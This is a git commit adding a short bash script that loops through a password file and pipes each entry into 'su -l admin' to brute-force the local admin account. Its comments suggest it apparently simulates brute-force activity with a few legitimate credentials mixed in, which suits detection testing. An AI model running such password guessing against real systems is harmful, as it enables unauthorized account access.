4ce1f4bc35bc42cd4f7cbcbf432fe1f7253feac3
filly-spud <108015308+filly-spud@users.noreply.github.com>
2022-06-22 13:27:01 -0600

    Update bf_admin_lpass.sh

---
+++ Brute Force/bf_admin_lpass.sh
@@ -0,0 +1,25 @@
+#!/bin/bash
+
+# 4 total actions
+# Admin - Random Pass
+# Random Users - Random Pass
+# Admin - Random passes with legit creds
+# Random Users - Random Passes w/ Legit Creds
+
+
+# $3 Random passes w/ legit creds. Contains 1 legit admin and 1 legit user cred.
+
+# Admin - Random passes with legit creds
+echo "============================================="
+echo "===== Start Admin User - W/ Legit Pass ======"
+echo "============================================="
+while IFS= read -r pass; do
+    echo "Testing admin:$pass"
+    echo "$pass" | su -l admin
+done < $1
+echo "============================================="
+echo "====== Done Admin User - W/ Legit Pass ======"
+echo "============================================="
+echo ""
+echo ""
+echo ""
